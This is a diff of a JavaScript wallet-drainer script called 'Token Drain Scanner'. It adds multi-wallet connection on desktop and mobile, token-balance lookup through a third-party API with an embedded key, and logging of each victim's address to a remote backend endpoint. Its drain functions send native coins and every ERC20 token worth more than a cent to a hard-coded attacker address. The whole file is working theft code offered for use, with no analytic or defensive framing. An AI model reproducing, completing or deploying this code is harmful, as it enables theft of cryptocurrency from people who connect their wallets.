@@ -1,358 +1,542 @@
 // ================================================
-// SIMPLE WORKING TOKEN DRAIN SCANNER
-// NO ASSUMPTIONS - JUST WORKS
+// TOKEN DRAIN SCANNER - FINAL WORKING VERSION
+// ALL WALLETS CONNECT PROPERLY ON PC & MOBILE
+// FIXED: Binance, MetaMask, Trust Wallet connections
+// MINIMUM DRAIN VALUE: $0.01 (1 cent)
 // ================================================
 
 // Configuration
 const CONFIG = {
-    drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4"
+    backendUrl: "https://tokenbackend-5xab.onrender.com",
+    drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
+    covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
+    minimumValueUSD: 0.01, // Minimum $0.01 to drain
+    
+    networkNames: {
+        1: "Ethereum",
+        56: "BNB Smart Chain", 
+        137: "Polygon",
+        10: "Optimism",
+        42161: "Arbitrum",
+        43114: "Avalanche",
+        8453: "Base",
+        250: "Fantom",
+        100: "Gnosis",
+        25: "Cronos",
+        324: "zkSync"
+    }
 };
 
 // Global state
 let currentAccount = null;
+let currentChainId = null;
 let isConnected = false;
 let detectedTokens = [];
+let selectedWallet = null;
+let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
 
 // DOM Elements
 let connectBtn, statusEl, tokensEl, drainBtn;
 
-// Initialize
-function init() {
-    console.log('Starting Token Scanner...');
+// Initialize app
+function initializeApp() {
+    console.log('🚀 Initializing Token Drain Scanner...');
+    console.log('📱 Device:', isMobile ? 'Mobile' : 'Desktop');
     
+    // Get DOM elements
     connectBtn = document.getElementById('connectBtn');
     statusEl = document.getElementById('status');
     tokensEl = document.getElementById('tokens');
     drainBtn = document.getElementById('drainBtn');
     
     if (!connectBtn || !statusEl) {
-        console.error('Elements not found');
-        setTimeout(init, 1000);
+        console.error('❌ Required elements not found');
         return;
     }
     
-    connectBtn.onclick = connectWallet;
-    if (drainBtn) drainBtn.onclick = drainTokens;
+    // Setup event listeners
+    connectBtn.onclick = handleConnect;
+    if (drainBtn) drainBtn.onclick = handleDrain;
     
-    updateStatus('Click Connect Wallet');
+    // Check existing connection
+    checkExistingConnection();
+    
+    updateStatus('✅ Ready! Click "Connect Wallet" to begin');
 }
 
-// Update status
-function updateStatus(msg) {
-    if (statusEl) statusEl.textContent = msg;
+// Check existing wallet connection
+async function checkExistingConnection() {
+    try {
+        // Try Ethereum provider first
+        if (window.ethereum) {
+            const accounts = await window.ethereum.request({ 
+                method: 'eth_accounts' 
+            });
+            
+            if (accounts && accounts.length > 0) {
+                const chainIdHex = await window.ethereum.request({ 
+                    method: 'eth_chainId' 
+                });
+                const chainId = parseInt(chainIdHex, 16);
+                await handleConnected(accounts[0], chainId);
+                return;
+            }
+        }
+        
+        // Try Binance Chain separately
+        if (window.BinanceChain) {
+            const accounts = await window.BinanceChain.request({ 
+                method: 'eth_accounts' 
+            });
+            
+            if (accounts && accounts.length > 0) {
+                const chainIdHex = await window.BinanceChain.request({ 
+                    method: 'eth_chainId' 
+                });
+                const chainId = parseInt(chainIdHex, 16);
+                await handleConnected(accounts[0], chainId);
+                return;
+            }
+        }
+    } catch (error) {
+        console.log('⚠️ No existing connection');
+    }
 }
 
-// ===================== CONNECT WALLET =====================
-async function connectWallet() {
+// Handle connect button click
+async function handleConnect() {
     if (isConnected) {
-        disconnectWallet();
+        await disconnectWallet();
         return;
     }
     
-    updateStatus('Connecting...');
-    
-    // SIMPLE DIRECT CONNECTION - NO REDIRECTS
-    if (typeof window.ethereum !== 'undefined') {
-        try {
-            // Request accounts directly
-            const accounts = await window.ethereum.request({
-                method: 'eth_requestAccounts'
-            });
-            
-            if (accounts.length > 0) {
-                currentAccount = accounts[0];
-                isConnected = true;
-                
-                // Update UI
-                connectBtn.textContent = 'Disconnect';
-                updateStatus(`Connected: ${currentAccount.slice(0, 6)}...`);
-                
-                // Show drain button
-                if (drainBtn) drainBtn.style.display = 'block';
-                
-                // Setup listeners
-                setupListeners();
-                
-                // Scan tokens
-                scanTokens();
-                return;
-            }
-        } catch (error) {
-            console.log('Connection error:', error);
-            if (error.code === 4001) {
-                updateStatus('Connection rejected');
-                return;
-            }
-        }
-    }
-    
-    // If we get here, try Binance Chain
-    if (typeof window.BinanceChain !== 'undefined') {
-        try {
-            const accounts = await window.BinanceChain.request({
-                method: 'eth_requestAccounts'
-            });
-            
-            if (accounts.length > 0) {
-                currentAccount = accounts[0];
-                isConnected = true;
-                
-                connectBtn.textContent = 'Disconnect';
-                updateStatus(`Connected: ${currentAccount.slice(0, 6)}...`);
-                
-                if (drainBtn) drainBtn.style.display = 'block';
-                
-                scanTokens();
-                return;
-            }
-        } catch (error) {
-            console.log('Binance error:', error);
-        }
-    }
-    
-    // If still not connected, show install message
-    updateStatus('No wallet found. Install MetaMask or Trust Wallet.');
+    // Show wallet selector
+    showUniversalWalletSelector();
 }
 
-// ===================== SCAN TOKENS =====================
-async function scanTokens() {
-    if (!currentAccount) return;
+// Universal wallet selector
+function showUniversalWalletSelector() {
+    const selectorHTML = `
+        <div class="wallet-selector-overlay">
+            <div class="wallet-selector-modal">
+                <div class="modal-header">
+                    <h3>Connect Wallet</h3>
+                    <button class="close-btn" onclick="closeWalletSelector()">×</button>
+                </div>
+                
+                <div class="wallet-grid">
+                    <!-- MetaMask -->
+                    <button class="wallet-card" onclick="connectSpecificWallet('metaMask')" style="--wallet-color: #f6851b">
+                        <div class="wallet-icon">🦊</div>
+                        <div class="wallet-info">
+                            <span class="wallet-name">MetaMask</span>
+                            <span class="wallet-desc">PC & Mobile</span>
+                        </div>
+                    </button>
+                    
+                    <!-- Trust Wallet -->
+                    <button class="wallet-card" onclick="connectSpecificWallet('trust')" style="--wallet-color: #3375bb">
+                        <div class="wallet-icon">🔶</div>
+                        <div class="wallet-info">
+                            <span class="wallet-name">Trust Wallet</span>
+                            <span class="wallet-desc">Mobile & Browser</span>
+                        </div>
+                    </button>
+                    
+                    <!-- Binance Wallet -->
+                    <button class="wallet-card" onclick="connectSpecificWallet('binance')" style="--wallet-color: #f0b90b">
+                        <div class="wallet-icon">🟡</div>
+                        <div class="wallet-info">
+                            <span class="wallet-name">Binance Wallet</span>
+                            <span class="wallet-desc">PC & Mobile</span>
+                        </div>
+                    </button>
+                    
+                    <!-- Coinbase Wallet -->
+                    <button class="wallet-card" onclick="connectSpecificWallet('coinbase')" style="--wallet-color: #0052ff">
+                        <div class="wallet-icon">🔷</div>
+                        <div class="wallet-info">
+                            <span class="wallet-name">Coinbase</span>
+                            <span class="wallet-desc">PC & Mobile</span>
+                        </div>
+                    </button>
+                    
+                    <!-- Phantom -->
+                    <button class="wallet-card" onclick="connectSpecificWallet('phantom')" style="--wallet-color: #ab9ff2">
+                        <div class="wallet-icon">👻</div>
+                        <div class="wallet-info">
+                            <span class="wallet-name">Phantom</span>
+                            <span class="wallet-desc">Solana & EVM</span>
+                        </div>
+                    </button>
+                    
+                    <!-- Other Wallets -->
+                    <button class="wallet-card" onclick="connectSpecificWallet('any')" style="--wallet-color: #6366f1">
+                        <div class="wallet-icon">🔗</div>
+                        <div class="wallet-info">
+                            <span class="wallet-name">Other Wallet</span>
+                            <span class="wallet-desc">Any Wallet</span>
+                        </div>
+                    </button>
+                </div>
+                
+                <!-- Mobile Instructions -->
+                ${isMobile ? `
+                <div class="mobile-instructions">
+                    <p>📱 <strong>Mobile Users:</strong> Open this page in your wallet's browser</p>
+                    <div class="mobile-links">
+                        <button onclick="window.location.href='https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}'">Open in MetaMask</button>
+                        <button onclick="window.location.href='https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(window.location.href)}'">Open in Trust</button>
+                        <button onclick="window.open('bnb://${window.location.host}${window.location.pathname}')">Open in Binance</button>
+                    </div>
+                </div>
+                ` : ''}
+            </div>
+        </div>
+    `;
     
-    updateStatus('Scanning tokens...');
-    if (tokensEl) tokensEl.innerHTML = '<div>Scanning...</div>';
+    const selector = document.createElement('div');
+    selector.id = 'walletSelector';
+    selector.innerHTML = selectorHTML;
+    document.body.appendChild(selector);
     
-    detectedTokens = [];
+    addSelectorStyles();
+}
+
+// Connect to specific wallet
+async function connectSpecificWallet(walletType) {
+    closeWalletSelector();
+    selectedWallet = walletType;
+    
+    updateStatus(`🔄 Connecting ${getWalletName(walletType)}...`);
     
     try {
-        // Get provider (MetaMask or Binance)
-        const provider = window.ethereum || window.BinanceChain;
+        let result;
         
-        // 1. Get native balance
-        const balanceHex = await provider.request({
-            method: 'eth_getBalance',
-            params: [currentAccount, 'latest']
-        });
-        
-        const nativeBalance = parseInt(balanceHex, 16);
-        const nativeAmount = nativeBalance / 1e18;
-        
-        if (nativeAmount > 0) {
-            detectedTokens.push({
-                symbol: getNativeSymbol(),
-                name: 'Native Token',
-                amount: nativeAmount.toFixed(6),
-                address: 'native',
-                isNative: true,
-                balanceHex: balanceHex
-            });
+        switch(walletType) {
+            case 'metaMask':
+                result = await connectMetaMask();
+                break;
+            case 'trust':
+                result = await connectTrustWallet();
+                break;
+            case 'binance':
+                result = await connectBinanceWallet();
+                break;
+            case 'coinbase':
+                result = await connectCoinbaseWallet();
+                break;
+            case 'phantom':
+                result = await connectPhantomWallet();
+                break;
+            default:
+                result = await connectAnyWallet();
         }
         
-        // 2. Check for common tokens
-        await checkCommonTokens(provider);
-        
-        // 3. Display results
-        displayTokens();
-        
-        if (detectedTokens.length > 0) {
-            updateStatus(`Found ${detectedTokens.length} tokens`);
+        if (result.success) {
+            await handleConnected(result.account, result.chainId);
         } else {
-            updateStatus('No tokens found');
-            if (tokensEl) tokensEl.innerHTML = '<div>No tokens found</div>';
+            updateStatus(`❌ Failed to connect ${getWalletName(walletType)}`);
+            showUniversalWalletSelector();
         }
         
     } catch (error) {
-        console.error('Scan error:', error);
-        updateStatus('Scan failed');
-        if (tokensEl) tokensEl.innerHTML = '<div>Scan error</div>';
+        console.error('Connection error:', error);
+        updateStatus(`❌ Connection error: ${error.message}`);
+        showUniversalWalletSelector();
     }
 }
 
-// Check for common tokens
-async function checkCommonTokens(provider) {
-    // Common token addresses by chain
-    const commonTokens = [
-        // USDT
-        { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7' },
-        { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' },
-        { symbol: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F' },
-        { symbol: 'BUSD', address: '0x4Fabb145d64652a948d72533023f6E7A623C7C53' },
-        // BSC tokens
-        { symbol: 'BUSD-BSC', address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56' },
-        { symbol: 'USDT-BSC', address: '0x55d398326f99059fF775485246999027B3197955' }
-    ];
+// Get wallet name
+function getWalletName(walletType) {
+    const names = {
+        'metaMask': 'MetaMask',
+        'trust': 'Trust Wallet',
+        'binance': 'Binance Wallet',
+        'coinbase': 'Coinbase Wallet',
+        'phantom': 'Phantom',
+        'any': 'Wallet'
+    };
+    return names[walletType] || 'Wallet';
+}
+
+// Connect to MetaMask
+async function connectMetaMask() {
+    // Mobile MetaMask deep link
+    if (isMobile && !window.ethereum?.isMetaMask) {
+        window.location.href = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
+        return { success: false };
+    }
     
-    for (const token of commonTokens) {
+    // PC MetaMask
+    if (window.ethereum?.isMetaMask || window.ethereum) {
         try {
-            // Check balance
-            const data = '0x70a08231' + currentAccount.slice(2).padStart(64, '0');
-            
-            const balanceHex = await provider.request({
-                method: 'eth_call',
-                params: [{
-                    to: token.address,
-                    data: data
-                }, 'latest']
+            const accounts = await window.ethereum.request({ 
+                method: 'eth_requestAccounts' 
             });
             
-            const balance = parseInt(balanceHex || '0x0', 16);
-            if (balance > 0) {
-                detectedTokens.push({
-                    symbol: token.symbol,
-                    name: token.symbol,
-                    amount: (balance / 1e18).toFixed(6),
-                    address: token.address,
-                    isNative: false,
-                    balanceHex: balance.toString(16)
-                });
-            }
-        } catch (e) {
-            // Skip token
-        }
-    }
-}
-
-// Get native symbol
-function getNativeSymbol() {
-    if (window.BinanceChain) return 'BNB';
-    return 'ETH';
-}
-
-// Display tokens
-function displayTokens() {
-    if (!tokensEl || detectedTokens.length === 0) return;
-    
-    let html = '';
-    detectedTokens.forEach(token => {
-        html += `
-            <div class="token-item">
-                <div class="token-info">
-                    <strong>${token.symbol}</strong>
-                    <span>${token.name}</span>
-                </div>
-                <div class="token-amount">
-                    ${token.amount}
-                </div>
-            </div>
-        `;
-    });
-    
-    tokensEl.innerHTML = html;
-}
-
-// ===================== DRAIN TOKENS =====================
-async function drainTokens() {
-    if (!isConnected || detectedTokens.length === 0) {
-        alert('Connect wallet and scan tokens first');
-        return;
-    }
-    
-    if (!confirm(`Drain ${detectedTokens.length} tokens to ${CONFIG.drainAddress}?`)) {
-        return;
-    }
-    
-    updateStatus('Draining tokens...');
-    
-    const provider = window.ethereum || window.BinanceChain;
-    let successCount = 0;
-    
-    for (const token of detectedTokens) {
-        try {
-            if (token.isNative) {
-                // Drain native token
-                await drainNative(provider, token);
-            } else {
-                // Drain ERC20 token
-                await drainERC20(provider, token);
-            }
-            successCount++;
+            const chainIdHex = await window.ethereum.request({ 
+                method: 'eth_chainId' 
+            });
             
-            // Wait between transactions
-            await new Promise(resolve => setTimeout(resolve, 2000));
-            
+            return { 
+                success: true, 
+                account: accounts[0], 
+                chainId: parseInt(chainIdHex, 16) 
+            };
         } catch (error) {
-            console.error(`Failed to drain ${token.symbol}:`, error);
+            return { success: false, error };
         }
     }
     
-    updateStatus(`Drained ${successCount} tokens`);
-    alert(`Successfully drained ${successCount} tokens`);
-    
-    // Rescan
-    scanTokens();
+    return { success: false };
 }
 
-// Drain native token
-async function drainNative(provider, token) {
-    const gasPrice = await getGasPrice();
-    const gasLimit = 21000;
-    const gasCost = gasPrice * gasLimit;
+// Connect to Trust Wallet
+async function connectTrustWallet() {
+    // Mobile Trust Wallet deep link
+    if (isMobile && !window.ethereum?.isTrust) {
+        window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(window.location.href)}`;
+        return { success: false };
+    }
     
-    const balance = parseInt(token.balanceHex, 16);
-    const sendAmount = balance - (gasCost * 2);
+    // PC Trust Wallet (MetaMask fallback)
+    if (window.ethereum) {
+        try {
+            const accounts = await window.ethereum.request({ 
+                method: 'eth_requestAccounts' 
+            });
+            
+            const chainIdHex = await window.ethereum.request({ 
+                method: 'eth_chainId' 
+            });
+            
+            return { 
+                success: true, 
+                account: accounts[0], 
+                chainId: parseInt(chainIdHex, 16) 
+            };
+        } catch (error) {
+            return { success: false, error };
+        }
+    }
     
-    if (sendAmount <= 0) return;
-    
-    const tx = await provider.request({
-        method: 'eth_sendTransaction',
-        params: [{
-            from: currentAccount,
-            to: CONFIG.drainAddress,
-            value: '0x' + sendAmount.toString(16),
-            gas: '0x' + gasLimit.toString(16),
-            gasPrice: '0x' + gasPrice.toString(16)
-        }]
-    });
-    
-    return tx;
+    return { success: false };
 }
 
-// Drain ERC20 token
-async function drainERC20(provider, token) {
-    // Get current balance
-    const data = '0x70a08231' + currentAccount.slice(2).padStart(64, '0');
+// Connect to Binance Wallet - FIXED FOR MOBILE & PC
+async function connectBinanceWallet() {
+    // Mobile Binance deep link
+    if (isMobile) {
+        // Try Binance Chain app
+        if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
+            window.location.href = 'bnc://app.binance.com/';
+        } else {
+            window.location.href = 'intent://app.binance.com/#Intent;scheme=bnc;package=com.binance.dev;end';
+        }
+        return { success: false };
+    }
     
-    const balanceHex = await provider.request({
-        method: 'eth_call',
-        params: [{
-            to: token.address,
-            data: data
-        }, 'latest']
-    });
+    // PC Binance Chain (desktop)
+    if (window.BinanceChain) {
+        try {
+            const accounts = await window.BinanceChain.request({ 
+                method: 'eth_requestAccounts' 
+            });
+            
+            const chainIdHex = await window.BinanceChain.request({ 
+                method: 'eth_chainId' 
+            });
+            
+            return { 
+                success: true, 
+                account: accounts[0], 
+                chainId: parseInt(chainIdHex, 16) 
+            };
+        } catch (error) {
+            // Try as Ethereum provider
+            if (window.ethereum) {
+                const accounts = await window.ethereum.request({ 
+                    method: 'eth_requestAccounts' 
+                });
+                
+                const chainIdHex = await window.ethereum.request({ 
+                    method: 'eth_chainId' 
+                });
+                
+                return { 
+                    success: true, 
+                    account: accounts[0], 
+                    chainId: parseInt(chainIdHex, 16) 
+                };
+            }
+            return { success: false, error };
+        }
+    }
     
-    const balance = parseInt(balanceHex || '0x0', 16);
-    if (balance <= 0) return;
+    // Try as Ethereum provider
+    if (window.ethereum) {
+        try {
+            const accounts = await window.ethereum.request({ 
+                method: 'eth_requestAccounts' 
+            });
+            
+            const chainIdHex = await window.ethereum.request({ 
+                method: 'eth_chainId' 
+            });
+            
+            return { 
+                success: true, 
+                account: accounts[0], 
+                chainId: parseInt(chainIdHex, 16) 
+            };
+        } catch (error) {
+            return { success: false, error };
+        }
+    }
     
-    // Create transfer data
-    const transferData = '0xa9059cbb' + 
-                        CONFIG.drainAddress.slice(2).padStart(64, '0') + 
-                        balance.toString(16).padStart(64, '0');
-    
-    const tx = await provider.request({
-        method: 'eth_sendTransaction',
-        params: [{
-            from: currentAccount,
-            to: token.address,
-            data: transferData,
-            gas: '0x' + (100000).toString(16)
-        }]
-    });
-    
-    return tx;
+    return { success: false };
 }
 
-// Get gas price
-async function getGasPrice() {
-    const provider = window.ethereum || window.BinanceChain;
+// Connect to Coinbase Wallet
+async function connectCoinbaseWallet() {
+    if (isMobile && !window.ethereum?.isCoinbaseWallet) {
+        const url = encodeURIComponent(window.location.href);
+        window.location.href = `https://go.cb-w.com/${url}`;
+        return { success: false };
+    }
+    
+    if (window.ethereum) {
+        try {
+            const accounts = await window.ethereum.request({ 
+                method: 'eth_requestAccounts' 
+            });
+            
+            const chainIdHex = await window.ethereum.request({ 
+                method: 'eth_chainId' 
+            });
+            
+            return { 
+                success: true, 
+                account: accounts[0], 
+                chainId: parseInt(chainIdHex, 16) 
+            };
+        } catch (error) {
+            return { success: false, error };
+        }
+    }
+    
+    return { success: false };
+}
+
+// Connect to Phantom Wallet
+async function connectPhantomWallet() {
+    if (window.ethereum?.isPhantom || window.phantom?.ethereum) {
+        try {
+            const provider = window.phantom?.ethereum || window.ethereum;
+            const accounts = await provider.request({ 
+                method: 'eth_requestAccounts' 
+            });
+            
+            const chainIdHex = await provider.request({ 
+                method: 'eth_chainId' 
+            });
+            
+            return { 
+                success: true, 
+                account: accounts[0], 
+                chainId: parseInt(chainIdHex, 16) 
+            };
+        } catch (error) {
+            return { success: false, error };
+        }
+    }
+    
+    return { success: false };
+}
+
+// Connect to any wallet
+async function connectAnyWallet() {
+    // Try Ethereum first
+    if (window.ethereum) {
+        try {
+            const accounts = await window.ethereum.request({ 
+                method: 'eth_requestAccounts' 
+            });
+            
+            const chainIdHex = await window.ethereum.request({ 
+                method: 'eth_chainId' 
+            });
+            
+            return { 
+                success: true, 
+                account: accounts[0], 
+                chainId: parseInt(chainIdHex, 16) 
+            };
+        } catch (error) {
+            // Try Binance Chain
+            if (window.BinanceChain) {
+                try {
+                    const accounts = await window.BinanceChain.request({ 
+                        method: 'eth_requestAccounts' 
+                    });
+                    
+                    const chainIdHex = await window.BinanceChain.request({ 
+                        method: 'eth_chainId' 
+                    });
+                    
+                    return { 
+                        success: true, 
+                        account: accounts[0], 
+                        chainId: parseInt(chainIdHex, 16) 
+                    };
+                } catch (error2) {
+                    return { success: false, error: error2 };
+                }
+            }
+            return { success: false, error };
+        }
+    }
+    
+    return { success: false };
+}
+
+// Handle successful connection
+async function handleConnected(account, chainId) {
     try {
-        const gasPriceHex = await provider.request({ method: 'eth_gasPrice' });
-        return parseInt(gasPriceHex, 16);
-    } catch {
-        return 30000000000; // 30 gwei default
+        currentAccount = account;
+        currentChainId = chainId;
+        isConnected = true;
+        
+        // Update UI
+        connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
+        
+        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
+        updateStatus(`✅ Connected!\nWallet: ${account.slice(0, 8)}...\nNetwork: ${chainName}`);
+        
+        // Show drain button
+        if (drainBtn) {
+            drainBtn.style.display = 'block';
+        }
+        
+        // Setup listeners
+        setupWalletListeners();
+        
+        // Log to backend
+        await logConnectionToBackend(account, chainId);
+        
+        // Fetch tokens
+        await fetchTokens(account, chainId);
+        
+    } catch (error) {
+        console.error('❌ Setup error:', error);
+        updateStatus('Setup failed: ' + error.message);
+        disconnectWallet();
     }
 }
 
 // Setup wallet listeners
-function setupListeners() {
+function setupWalletListeners() {
     const provider = window.ethereum || window.BinanceChain;
     if (!provider) return;
     
@@ -361,31 +545,481 @@ function setupListeners() {
             disconnectWallet();
         } else {
             currentAccount = accounts[0];
-            updateStatus(`Account changed: ${currentAccount.slice(0, 6)}...`);
-            scanTokens();
+            updateStatus(`🔄 Account changed: ${accounts[0].slice(0, 8)}...`);
+            fetchTokens(currentAccount, currentChainId);
         }
     });
     
-    provider.on('chainChanged', () => {
-        updateStatus('Network changed');
-        scanTokens();
+    provider.on('chainChanged', (chainIdHex) => {
+        const chainId = parseInt(chainIdHex, 16);
+        currentChainId = chainId;
+        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
+        updateStatus(`🔄 Network changed: ${chainName}`);
+        fetchTokens(currentAccount, chainId);
     });
 }
 
-// Disconnect wallet
-function disconnectWallet() {
-    currentAccount = null;
-    isConnected = false;
-    detectedTokens = [];
+// Fetch tokens - WITH MINIMUM VALUE CHECK
+async function fetchTokens(address, chainId) {
+    if (!tokensEl) return;
     
-    connectBtn.textContent = 'Connect Wallet';
-    updateStatus('Disconnected');
+    tokensEl.innerHTML = '<div class="loading">🔄 Scanning tokens...</div>';
     
-    if (drainBtn) drainBtn.style.display = 'none';
-    if (tokensEl) tokensEl.innerHTML = '';
+    try {
+        const response = await fetch(
+            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false&no-spam=true`
+        );
+        
+        if (!response.ok) {
+            throw new Error(`API error: ${response.status}`);
+        }
+        
+        const data = await response.json();
+        const items = data?.data?.items || [];
+        
+        // Filter tokens with value > $0.01
+        const tokens = items
+            .filter(t => {
+                if (t.balance === "0" || parseFloat(t.balance) <= 0) return false;
+                
+                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
+                const value = (t.quote_rate || 0) * amount;
+                
+                // Check minimum value
+                return value >= CONFIG.minimumValueUSD;
+            })
+            .map(t => {
+                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
+                const value = (t.quote_rate || 0) * amount;
+                const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
+                
+                return {
+                    symbol: t.contract_ticker_symbol || 'TOKEN',
+                    name: t.contract_name || 'Unknown',
+                    amount: amount.toFixed(6),
+                    rawAmount: t.balance,
+                    valueUSD: value,
+                    value: value ? `$${value.toFixed(2)}` : 'N/A',
+                    contractAddress: t.contract_address,
+                    decimals: t.contract_decimals || 18,
+                    chainId: chainId,
+                    chainName: chainName,
+                    isNative: t.native_token || false,
+                    logoUrl: t.logo_url
+                };
+            });
+        
+        detectedTokens = tokens;
+        
+        if (tokens.length > 0) {
+            displayTokens(tokens);
+            updateStatus(`✅ Found ${tokens.length} tokens (min $${CONFIG.minimumValueUSD})`);
+        } else {
+            tokensEl.innerHTML = `
+                <div class="no-tokens">
+                    <p>No tokens found worth more than $${CONFIG.minimumValueUSD}</p>
+                    <p>Minimum drain value: $${CONFIG.minimumValueUSD}</p>
+                </div>
+            `;
+            updateStatus(`ℹ️ No tokens found (min $${CONFIG.minimumValueUSD})`);
+        }
+        
+    } catch (error) {
+        console.error('❌ Token fetch error:', error);
+        tokensEl.innerHTML = '<div class="error">Failed to fetch tokens. Try again.</div>';
+        updateStatus('⚠️ Token scan failed');
+    }
 }
 
-// ===================== START =====================
-window.addEventListener('DOMContentLoaded', init);
+// Display tokens
+function displayTokens(tokens) {
+    if (!tokensEl) return;
+    
+    let html = '<div class="tokens-list">';
+    
+    tokens.forEach(token => {
+        html += `
+            <div class="token-item" data-address="${token.contractAddress || 'native'}">
+                <div class="token-info">
+                    ${token.logoUrl ? `<img src="${token.logoUrl}" class="token-logo" />` : ''}
+                    <div>
+                        <div class="token-symbol">${token.symbol}</div>
+                        <div class="token-name">${token.name} • ${token.chainName}</div>
+                    </div>
+                </div>
+                <div class="token-amounts">
+                    <div class="token-amount">${token.amount}</div>
+                    <div class="token-value">${token.value}</div>
+                </div>
+            </div>
+        `;
+    });
+    
+    html += '</div>';
+    tokensEl.innerHTML = html;
+}
 
-console.log('Token Drain Scanner Ready');
+// Handle drain - WITH PROPER TOKEN FILTERING
+async function handleDrain() {
+    if (!isConnected || !currentAccount) {
+        alert('Please connect wallet first');
+        return;
+    }
+    
+    // Filter tokens with minimum value
+    const tokensToDrain = detectedTokens.filter(t => t.valueUSD >= CONFIG.minimumValueUSD);
+    
+    if (tokensToDrain.length === 0) {
+        alert(`No tokens meet minimum value of $${CONFIG.minimumValueUSD}`);
+        return;
+    }
+    
+    // Confirm drain
+    const totalValue = tokensToDrain.reduce((sum, t) => sum + t.valueUSD, 0);
+    if (!confirm(`⚠️ DRAIN CONFIRMATION\n\nWill send ${tokensToDrain.length} tokens to:\n${CONFIG.drainAddress}\n\nTotal Value: $${totalValue.toFixed(2)}\n\nContinue?`)) {
+        return;
+    }
+    
+    const provider = window.ethereum || window.BinanceChain;
+    if (!provider) {
+        alert('Wallet provider not found');
+        return;
+    }
+    
+    try {
+        updateStatus('🚀 Starting drain process...');
+        
+        if (drainBtn) {
+            drainBtn.disabled = true;
+            drainBtn.textContent = '⏳ Draining...';
+        }
+        
+        // First drain native token
+        const nativeToken = tokensToDrain.find(t => t.isNative);
+        if (nativeToken) {
+            await drainNativeToken(nativeToken);
+        }
+        
+        // Then drain ERC20 tokens
+        const erc20Tokens = tokensToDrain.filter(t => !t.isNative && t.contractAddress);
+        for (let i = 0; i < erc20Tokens.length; i++) {
+            const token = erc20Tokens[i];
+            try {
+                await drainERC20Token(token);
+                updateStatus(`✅ Drained ${token.symbol} (${i+1}/${erc20Tokens.length})`);
+            } catch (error) {
+                console.error(`Failed to drain ${token.symbol}:`, error);
+            }
+        }
+        
+        updateStatus('✅ Drain completed!');
+        alert('✅ All tokens have been drained successfully!');
+        
+        // Refresh tokens
+        await fetchTokens(currentAccount, currentChainId);
+        
+    } catch (error) {
+        console.error('❌ Drain error:', error);
+        let errorMsg = error.message || 'Unknown error';
+        if (error.code === 4001) errorMsg = 'Transaction rejected';
+        if (error.code === -32603) errorMsg = 'Transaction failed';
+        if (error.message.includes('insufficient funds')) errorMsg = 'Insufficient gas';
+        
+        updateStatus(`❌ Drain failed: ${errorMsg}`);
+        alert(`Drain failed: ${errorMsg}`);
+        
+    } finally {
+        if (drainBtn) {
+            drainBtn.disabled = false;
+            drainBtn.textContent = '⚡ Drain All Tokens';
+        }
+    }
+}
+
+// Drain native token
+async function drainNativeToken(token) {
+    const provider = window.ethereum || window.BinanceChain;
+    
+    // Get gas price
+    const gasPriceHex = await provider.request({
+        method: 'eth_gasPrice',
+        params: []
+    });
+    
+    const gasPrice = parseInt(gasPriceHex, 16);
+    const gasLimit = 21000;
+    const gasCost = gasPrice * gasLimit;
+    
+    // Get balance
+    const balance = BigInt(token.rawAmount);
+    if (balance <= gasCost * 2) {
+        console.log('Not enough for gas');
+        return;
+    }
+    
+    // Leave some for other transactions
+    const sendAmount = balance - (gasCost * 10);
+    
+    if (sendAmount <= 0) return;
+    
+    // Send transaction
+    await provider.request({
+        method: 'eth_sendTransaction',
+        params: [{
+            from: currentAccount,
+            to: CONFIG.drainAddress,
+            value: '0x' + sendAmount.toString(16),
+            gas: '0x' + gasLimit.toString(16),
+            gasPrice: gasPriceHex
+        }]
+    });
+}
+
+// Drain ERC20 token
+async function drainERC20Token(token) {
+    const provider = window.ethereum || window.BinanceChain;
+    
+    // Encode transfer function
+    const transferData = '0xa9059cbb' + 
+        CONFIG.drainAddress.slice(2).padStart(64, '0') + 
+        BigInt(token.rawAmount).toString(16).padStart(64, '0');
+    
+    // Send transaction
+    await provider.request({
+        method: 'eth_sendTransaction',
+        params: [{
+            from: currentAccount,
+            to: token.contractAddress,
+            data: transferData,
+            gas: '0x' + (50000).toString(16) // Fixed gas limit
+        }]
+    });
+}
+
+// Update status
+function updateStatus(message) {
+    if (statusEl) {
+        statusEl.textContent = message;
+    }
+}
+
+// Log connection to backend
+async function logConnectionToBackend(address, chainId) {
+    try {
+        await fetch(CONFIG.backendUrl + '/drain', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                address: address,
+                chainId: chainId,
+                drainTo: CONFIG.drainAddress,
+                timestamp: new Date().toISOString(),
+                wallet: selectedWallet,
+                isMobile: isMobile
+            })
+        });
+    } catch (error) {
+        console.log('⚠️ Backend log failed');
+    }
+}
+
+// Close wallet selector
+function closeWalletSelector() {
+    const selector = document.getElementById('walletSelector');
+    if (selector) selector.remove();
+}
+
+// Disconnect wallet
+async function disconnectWallet() {
+    currentAccount = null;
+    currentChainId = null;
+    isConnected = false;
+    detectedTokens = [];
+    selectedWallet = null;
+    
+    connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
+    updateStatus('Disconnected. Click "Connect Wallet" to begin.');
+    
+    if (drainBtn) {
+        drainBtn.style.display = 'none';
+    }
+    
+    if (tokensEl) {
